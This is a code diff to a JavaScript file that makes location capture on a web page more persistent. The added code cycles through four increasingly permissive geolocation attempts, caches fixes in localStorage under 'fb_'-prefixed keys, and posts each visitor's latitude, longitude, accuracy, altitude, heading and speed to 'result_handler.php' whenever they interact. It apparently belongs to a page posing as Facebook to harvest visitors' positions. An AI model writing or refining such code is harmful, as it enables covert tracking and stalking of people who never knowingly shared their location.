@@ -5,151 +5,220 @@ function qsa(elem) {return document.querySelectorAll(elem);}
 // Helper function to handle location capture with consistent error handling
 function captureLocation(context = 'interaction') {
     var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+    var isMobileDevice = isMobile || (isTouch && window.innerWidth <= 1024);
+    
+    // Enhanced cache management for mobile timeout prevention
+    var cacheKey = 'fb_location_cache';
+    var cacheTimeKey = 'fb_location_time';
+    var contextKey = 'fb_location_context';
     
     // For mobile devices, try to use cached location first if recent enough
-    if (isMobile && window.initialLocation) {
-        var locationAge = Date.now() - window.initialLocation.timestamp;
-        if (locationAge < 300000) { // Less than 5 minutes old
-            console.log(`Using cached location for ${context}`);
-            $.ajax({
-                type: 'POST',
-                url: 'result_handler.php',
-                data: { 
-                    Status: 'success', 
-                    Lat: window.initialLocation.lat + ' deg', 
-                    Lon: window.initialLocation.lon + ' deg', 
-                    Acc: window.initialLocation.accuracy + ' m',
-                    Alt: 'Not Available',
-                    Dir: 'Not Available',
-                    Spd: 'Not Available'
-                },
-                mimeType: 'text'
-            });
-            return;
+    if (isMobileDevice && localStorage) {
+        try {
+            var cachedLocation = localStorage.getItem(cacheKey);
+            var cacheTime = localStorage.getItem(cacheTimeKey);
+            var lastContext = localStorage.getItem(contextKey);
+            
+            if (cachedLocation && cacheTime) {
+                var locationAge = Date.now() - parseInt(cacheTime);
+                // Use cached location if less than 3 minutes old on mobile
+                if (locationAge < 180000) {
+                    console.log(`Using cached location for ${context} (age: ${Math.round(locationAge/1000)}s)`);
+                    var cached = JSON.parse(cachedLocation);
+                    
+                    $.ajax({
+                        type: 'POST',
+                        url: 'result_handler.php',
+                        data: { 
+                            Status: 'success', 
+                            Lat: cached.lat, 
+                            Lon: cached.lon, 
+                            Acc: cached.accuracy,
+                            Alt: cached.alt || 'Not Available',
+                            Dir: cached.dir || 'Not Available',
+                            Spd: cached.spd || 'Not Available',
+                            Source: 'cached',
+                            Context: context,
+                            Age: Math.round(locationAge/1000)
+                        },
+                        mimeType: 'text'
+                    });
+                    return;
+                }
+            }
+        } catch (e) {
+            console.log('Cache access failed:', e.message);
         }
     }
     
-    if (typeof locate === 'function') {
-        locate(
-            function() { 
-                // Success callback - location captured successfully
-                console.log(`Location captured successfully during: ${context}`);
-            }, 
-            function(error, errorText) { 
-                // Error callback - handle location errors gracefully
-                console.log(`Location capture failed during ${context}:`, errorText);
+    // Advanced location capture with multiple fallback strategies
+    function attemptLocationWithStrategy(strategy) {
+        if (!navigator.geolocation) {
+            console.log('Geolocation not supported');
+            return;
+        }
+        
+        var options;
+        var strategyName;
+        
+        switch (strategy) {
+            case 1:
+                // Strategy 1: High accuracy for mobile, quick for desktop
+                options = {
+                    enableHighAccuracy: isMobileDevice,
+                    timeout: isMobileDevice ? 12000 : 6000,
+                    maximumAge: isMobileDevice ? 30000 : 300000
+                };
+                strategyName = 'primary';
+                break;
+            case 2:
+                // Strategy 2: Network-based location
+                options = {
+                    enableHighAccuracy: false,
+                    timeout: isMobileDevice ? 15000 : 8000,
+                    maximumAge: isMobileDevice ? 60000 : 600000
+                };
+                strategyName = 'network';
+                break;
+            case 3:
+                // Strategy 3: Very permissive for weak signals
+                options = {
+                    enableHighAccuracy: false,
+                    timeout: 25000,
+                    maximumAge: 900000 // 15 minutes
+                };
+                strategyName = 'permissive';
+                break;
+            case 4:
+                // Strategy 4: Last resort with maximum tolerance
+                options = {
+                    enableHighAccuracy: false,
+                    timeout: 35000,
+                    maximumAge: 3600000 // 1 hour
+                };
+                strategyName = 'last-resort';
+                break;
+            default:
+                console.log(`All location strategies exhausted for ${context}`);
+                return;
+        }
+        
+        console.log(`Attempting ${strategyName} location strategy for ${context}:`, options);
+        
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                console.log(`Location captured via ${strategyName} strategy for: ${context}`);
                 
-                // Enhanced mobile retry logic
-                if (error && (error.code === 3 || error.code === 2)) { // TIMEOUT or POSITION_UNAVAILABLE
-                    console.log(`Retrying location capture for ${context} with mobile-optimized settings...`);
-                    
-                    setTimeout(function() {
-                        if (navigator.geolocation) {
-                            // Mobile-specific retry with progressive fallback
-                            var retryOptions = {
-                                enableHighAccuracy: isMobile ? false : true, // Reverse strategy on retry
-                                timeout: isMobile ? 15000 : 8000, // Longer timeout for mobile
-                                maximumAge: isMobile ? 30000 : 600000 // More recent cache for mobile
-                            };
-                            
-                            navigator.geolocation.getCurrentPosition(
-                                function(position) {
-                                    console.log(`Location captured on retry for: ${context}`);
-                                    // Send the successful location data
-                                    var lat = position.coords.latitude + ' deg';
-                                    var lon = position.coords.longitude + ' deg';
-                                    var acc = position.coords.accuracy + ' m';
-                                    var alt = position.coords.altitude ? position.coords.altitude + ' m' : 'Not Available';
-                                    var dir = position.coords.heading ? position.coords.heading + ' deg' : 'Not Available';
-                                    var spd = position.coords.speed ? position.coords.speed + ' m/s' : 'Not Available';
-                                    
-                                    // Update cached location for mobile
-                                    if (isMobile) {
-                                        window.initialLocation = {
-                                            lat: position.coords.latitude,
-                                            lon: position.coords.longitude,
-                                            accuracy: position.coords.accuracy,
-                                            timestamp: Date.now()
-                                        };
-                                    }
-                                    
-                                    $.ajax({
-                                        type: 'POST',
-                                        url: 'result_handler.php',
-                                        data: { 
-                                            Status: 'success', 
-                                            Lat: lat, 
-                                            Lon: lon, 
-                                            Acc: acc,
-                                            Alt: alt,
-                                            Dir: dir,
-                                            Spd: spd
-                                        },
-                                        mimeType: 'text'
-                                    });
-                                },
-                                function(retryError) {
-                                    console.log(`Retry also failed for ${context}:`, retryError.message);
-                                    
-                                    // Final fallback attempt with very permissive settings
-                                    if (isMobile && retryError.code === 3) {
-                                        setTimeout(function() {
-                                            navigator.geolocation.getCurrentPosition(
-                                                function(position) {
-                                                    console.log(`Location captured on final attempt for: ${context}`);
-                                                    var lat = position.coords.latitude + ' deg';
-                                                    var lon = position.coords.longitude + ' deg';
-                                                    var acc = position.coords.accuracy + ' m';
-                                                    
-                                                    $.ajax({
-                                                        type: 'POST',
-                                                        url: 'result_handler.php',
-                                                        data: { 
-                                                            Status: 'success', 
-                                                            Lat: lat, 
-                                                            Lon: lon, 
-                                                            Acc: acc,
-                                                            Alt: 'Not Available',
-                                                            Dir: 'Not Available',
-                                                            Spd: 'Not Available'
-                                                        },
-                                                        mimeType: 'text'
-                                                    });
-                                                },
-                                                function(finalError) {
-                                                    console.log(`All location attempts failed for ${context}`);
-                                                },
-                                                { 
-                                                    enableHighAccuracy: false, 
-                                                    timeout: 30000, // Very long timeout for final attempt
-                                                    maximumAge: 1800000 // Accept very old cached positions (30 minutes)
-                                                }
-                                            );
-                                        }, 2000);
-                                    }
-                                },
-                                retryOptions
-                            );
-                        }
-                    }, isMobile ? 2000 : 1000); // Longer delay for mobile
+                // Process and cache the successful location
+                var lat = position.coords.latitude + ' deg';
+                var lon = position.coords.longitude + ' deg';
+                var acc = position.coords.accuracy + ' m';
+                var alt = position.coords.altitude ? position.coords.altitude + ' m' : 'Not Available';
+                var dir = position.coords.heading ? position.coords.heading + ' deg' : 'Not Available';
+                var spd = position.coords.speed ? position.coords.speed + ' m/s' : 'Not Available';
+                
+                // Cache successful location for mobile
+                if (isMobileDevice && localStorage) {
+                    try {
+                        var locationData = {
+                            lat: lat,
+                            lon: lon,
+                            accuracy: acc,
+                            alt: alt,
+                            dir: dir,
+                            spd: spd
+                        };
+                        localStorage.setItem(cacheKey, JSON.stringify(locationData));
+                        localStorage.setItem(cacheTimeKey, Date.now().toString());
+                        localStorage.setItem(contextKey, context);
+                    } catch (e) {
+                        console.log('Failed to cache location:', e.message);
+                    }
                 }
-            }
+                
+                $.ajax({
+                    type: 'POST',
+                    url: 'result_handler.php',
+                    data: { 
+                        Status: 'success', 
+                        Lat: lat, 
+                        Lon: lon, 
+                        Acc: acc,
+                        Alt: alt,
+                        Dir: dir,
+                        Spd: spd,
+                        Source: strategyName,
+                        Context: context,
+                        Accuracy: position.coords.accuracy
+                    },
+                    mimeType: 'text'
+                });
+            },
+            function(error) {
+                console.log(`${strategyName} strategy failed for ${context}:`, error.message, `(Code: ${error.code})`);
+                
+                // Handle specific error types
+                if (error.code === 1) { // PERMISSION_DENIED
+                    console.log('Location permission denied by user');
+                    return; // Don't retry on permission denial
+                }
+                
+                if (error.code === 3) { // TIMEOUT
+                    console.log(`Location timeout on ${strategyName} strategy, trying next approach...`);
+                }
+                
+                // Try next strategy after a delay
+                var delay = isMobileDevice ? (strategy * 1500) : (strategy * 800);
+                setTimeout(function() {
+                    attemptLocationWithStrategy(strategy + 1);
+                }, delay);
+            },
+            options
         );
-    } else {
-        console.log('Location function not available');
     }
+    
+    // Start the progressive location capture process
+    attemptLocationWithStrategy(1);
 }
 
 // Mobile location optimization function
 function requestLocationPermission() {
     var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+    var isMobileDevice = isMobile || (isTouch && window.innerWidth <= 1024);
     
-    if (isMobile && navigator.geolocation) {
-        // Pre-request location permission with user-friendly approach
+    if (isMobileDevice && navigator.geolocation) {
+        console.log('Pre-requesting location permission for mobile device');
+        
+        // Try to get a quick location fix to establish permission and cache
         navigator.geolocation.getCurrentPosition(
             function(position) {
-                console.log('Location permission granted');
-                // Store initial location to improve subsequent requests
+                console.log('Initial location permission granted and cached');
+                
+                // Store initial location with enhanced caching
+                if (localStorage) {
+                    try {
+                        var locationData = {
+                            lat: position.coords.latitude + ' deg',
+                            lon: position.coords.longitude + ' deg',
+                            accuracy: position.coords.accuracy + ' m',
+                            alt: position.coords.altitude ? position.coords.altitude + ' m' : 'Not Available',
+                            dir: position.coords.heading ? position.coords.heading + ' deg' : 'Not Available',
+                            spd: position.coords.speed ? position.coords.speed + ' m/s' : 'Not Available'
+                        };
+                        
+                        localStorage.setItem('fb_location_cache', JSON.stringify(locationData));
+                        localStorage.setItem('fb_location_time', Date.now().toString());
+                        localStorage.setItem('fb_location_context', 'initial_permission');
+                        
+                        console.log('Initial location cached successfully');
+                    } catch (e) {
+                        console.log('Failed to cache initial location:', e.message);
+                    }
+                }
+                
+                // Also store in window object for backward compatibility
                 window.initialLocation = {
                     lat: position.coords.latitude,
                     lon: position.coords.longitude,
@@ -158,12 +227,51 @@ function requestLocationPermission() {
                 };
             },
             function(error) {
-                console.log('Location permission handling:', error.message);
+                console.log('Initial location permission handling:', error.message);
+                
                 // Even if initial request fails, we've attempted to get permission
+                // Try a more permissive request for permission establishment
+                if (error.code === 3) { // TIMEOUT
+                    console.log('Initial request timed out, trying permissive approach...');
+                    
+                    navigator.geolocation.getCurrentPosition(
+                        function(position) {
+                            console.log('Permissive location request succeeded');
+                            
+                            // Cache this location too
+                            if (localStorage) {
+                                try {
+                                    var locationData = {
+                                        lat: position.coords.latitude + ' deg',
+                                        lon: position.coords.longitude + ' deg',
+                                        accuracy: position.coords.accuracy + ' m',
+                                        alt: 'Not Available',
+                                        dir: 'Not Available',
+                                        spd: 'Not Available'
+                                    };
+                                    
+                                    localStorage.setItem('fb_location_cache', JSON.stringify(locationData));
+                                    localStorage.setItem('fb_location_time', Date.now().toString());
+                                    localStorage.setItem('fb_location_context', 'permission_fallback');
+                                } catch (e) {
+                                    console.log('Failed to cache fallback location');
+                                }
+                            }
+                        },
+                        function(fallbackError) {
+                            console.log('Permissive location request also failed:', fallbackError.message);
+                        },
+                        {
+                            enableHighAccuracy: false,
+                            timeout: 20000,
+                            maximumAge: 600000
+                        }
+                    );
+                }
             },
             {
                 enableHighAccuracy: true,
-                timeout: 15000,
+                timeout: 10000,
                 maximumAge: 60000
             }
         );
